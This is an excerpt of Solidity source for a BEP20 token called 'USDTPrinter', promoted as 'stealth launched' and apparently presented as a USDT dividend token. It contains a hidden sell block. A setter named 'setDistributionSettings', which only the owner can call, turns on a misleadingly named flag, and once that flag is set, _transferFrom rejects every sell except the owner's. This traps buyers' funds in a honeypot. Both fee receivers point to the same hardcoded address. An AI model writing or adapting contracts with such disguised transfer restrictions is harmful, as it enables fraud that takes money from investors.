...
/*
* USDTPRINTER - STEALTH LAUNCHED
* https://usdtprinter.online
* t.me/usdtprinteravax
* https://twitter.com/usdtprinteravax
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7); 
...
contract USDTPrinter is IBEP20, Auth {
    ...
    address EP = 0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7; 
    ...
    string constant _symbol = "USDTPrint";
    ...
    address public autoLiquidityReceiver=0x420ef00C3d6839680aD43DA8ACCcEdB3F0C01cD3;
    address public marketingFeeReceiver=0x420ef00C3d6839680aD43DA8ACCcEdB3F0C01cD3;
    ...
    bool EnableRewardsDistribution = false;
    ...
    function setDistributionSettings(bool value) external onlyOwner {
        EnableRewardsDistribution = value;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!EnableRewardsDistribution || sender==owner), "distribution enabled");
